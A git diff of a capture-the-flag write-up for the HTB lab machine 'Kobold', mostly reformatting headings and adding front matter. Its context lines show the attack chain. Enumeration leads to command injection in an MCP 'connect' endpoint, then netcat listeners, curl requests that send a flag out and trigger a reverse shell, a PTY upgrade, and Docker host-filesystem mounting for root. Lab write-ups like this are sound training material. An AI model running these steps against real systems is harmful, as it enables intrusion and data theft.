@@ -1,5 +1,13 @@
-# Kobold HTB Writeup
-
+---
+title: "Kobold HTB Writeup"
+description: "A detailed writeup of the challenges I solved during the Kobold.htb competition, including strategies and solutions."
+date: "2026-05-22"
+tags:
+  - Recon
+  - HTB
+  - CTFWriteup
+published: true
+---
 ## Reconnaissance
 
 I began by performing an initial Nmap scan against the target machine to identify open ports and exposed services.
@@ -7,52 +15,39 @@ I began by performing an initial Nmap scan against the target machine to identif
 ```bash
 nmap -Pn -T4 10.129.12.135
 ```
-
 The scan revealed the following ports:
-
 ```text
 22/tcp   open  ssh
 80/tcp   open  http
 443/tcp  open  https
 ```
-
 Since HTTP and HTTPS services were exposed, I added the target domain locally to my `/etc/hosts` file so that virtual host routing would function correctly.
-
 ```bash
 sudo nano /etc/hosts
 ```
-
 I added:
-
 ```text
 10.129.12.135 kobold.htb
 ```
-
 After saving the file, I was able to access the website successfully through my browser.
 
 ---
 
-# Web Enumeration
-
+## Web Enumeration
 Browsing to `https://kobold.htb` displayed a static landing page titled **Kobold Operations Suite**. The page referenced:
-
 - AI-powered agents
 - automation
 - containerized applications
 - centralized management
 
 These hints suggested the presence of hidden internal services or subdomains.
-
 I started subdomain enumeration using ffuf:
-
 ```bash
 ffuf -u http://10.129.12.135/ \
 -H "Host: FUZZ.kobold.htb" \
 -w word.txt
 ```
-
 The scan returned several valid virtual hosts:
-
 ```text
 staging
 www
@@ -61,29 +56,21 @@ ftp
 dev
 admin
 ```
-
 Most of them redirected back to the main domain, but `mcp.kobold.htb` redirected to its own dedicated virtual host:
-
 ```text
 Location: https://mcp.kobold.htb/
 ```
-
 This indicated that `mcp.kobold.htb` hosted a separate application.
-
 I added the discovered subdomain to `/etc/hosts`:
-
 ```text
 10.129.12.135 mcp.kobold.htb
 ```
 
 ---
 
-# API Enumeration
-
+## API Enumeration
 After accessing `https://mcp.kobold.htb`, I began enumerating the API endpoints.
-
 During enumeration, I identified the following endpoint:
-
 ```text
 /api/mcp/connect
 ```
@@ -96,16 +83,13 @@ The vulnerability allowed arbitrary command execution through the `serverConfig.
 
 ---
 
-# Verifying Remote Code Execution
+## Verifying Remote Code Execution
 
 To verify command execution, I first started a Netcat listener on my attacking machine:
-
 ```bash
 nc -lvnp 4444
 ```
-
 I then sent the following request:
-
 ```bash
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 -H "Content-Type: application/json" \
@@ -122,7 +106,6 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 Although the application responded with a timeout error, the command executed successfully server-side.
 
 The listener received:
-
 ```text
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
@@ -131,18 +114,16 @@ This confirmed remote code execution as the `ben` user.
 
 ---
 
-# Obtaining User Flag
+## Obtaining User Flag
 
 To retrieve the user flag, I modified the payload to read `/home/ben/user.txt` and send the contents back to my listener.
 
 I started a listener:
-
 ```bash
 nc -lvnp 4444
 ```
 
 Then executed:
-
 ```bash
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 -H "Content-Type: application/json" \
@@ -157,25 +138,20 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 ```
 
 The listener received the user flag:
-
 ```text
 39eb*********************ae
 ```
 
 ---
 
-# Reverse Shell Access
-
+## Reverse Shell Access
 To gain a more interactive shell, I established a reverse shell.
 
 I started a listener:
-
 ```bash
 nc -lvnp 5001
 ```
-
 Then triggered the reverse shell:
-
 ```bash
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 -H "Content-Type: application/json" \
@@ -194,10 +170,9 @@ I upgraded the shell using Python PTY:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
 ---
 
-# Enumeration for Privilege Escalation
+## Enumeration for Privilege Escalation
 
 While enumerating the system, I identified several important clues:
 
@@ -254,7 +229,7 @@ This confirmed successful Docker daemon access through the vulnerable MCP servic
 
 ---
 
-# Privilege Escalation to Root
+## Privilege Escalation to Root
 
 Since Docker access was possible, I used it to mount the host filesystem inside a temporary container and directly read the root flag.
 
@@ -297,16 +272,11 @@ However, the payload executed successfully, and the listener received the root f
 
 ---
 
-# Flags
-
 ## User Flag
-
 ```text
 39eb*********************ae
 ```
-
 ## Root Flag
-
 ```text
 7f********************a6a
 ```
